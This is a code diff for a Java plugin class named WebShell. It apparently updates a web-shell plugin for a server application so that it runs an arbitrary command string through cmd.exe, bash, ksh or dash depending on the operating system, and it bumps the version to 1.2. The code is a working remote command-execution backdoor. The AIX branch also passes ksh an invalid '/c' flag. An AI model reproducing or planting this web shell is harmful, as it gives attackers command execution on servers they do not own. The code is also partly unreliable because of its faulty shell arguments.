@@ -1,9 +1,6 @@
-/*
- * To change this template, choose Tools | Templates
- * and open the template in the editor.
- */
 package podalirius;
 
+import org.apache.commons.lang3.SystemUtils;
 import java.io.IOException;
 import java.io.Writer;
 import java.io.File;
@@ -33,7 +30,7 @@ public class WebShell extends ExtDefaultPlugin implements PluginWebSupport {
     }
 
     public String getVersion() {
-        return "1.1";
+        return "1.2";
     }
 
     public String getDescription() {
@@ -73,6 +70,20 @@ public class WebShell extends ExtDefaultPlugin implements PluginWebSupport {
         String linebuffer = "";
 
         String[] commands = {"/bin/bash", "-c", cmd};
+
+        if (SystemUtils.IS_OS_WINDOWS) {
+            commands[0] = "cmd.exe";
+            commands[1] = "/c";
+        } else if (SystemUtils.IS_OS_AIX) {
+            commands[0] = "/bin/ksh";
+            commands[1] = "/c";
+        } else if (SystemUtils.IS_OS_LINUX) {
+            commands[0] = "/bin/bash";
+            commands[1] = "-c";
+        } else if (SystemUtils.IS_OS_MAC) {
+            commands[0] = "/bin/dash";
+            commands[1] = "-c";
+        }
 
         try {
             Runtime rt = Runtime.getRuntime();
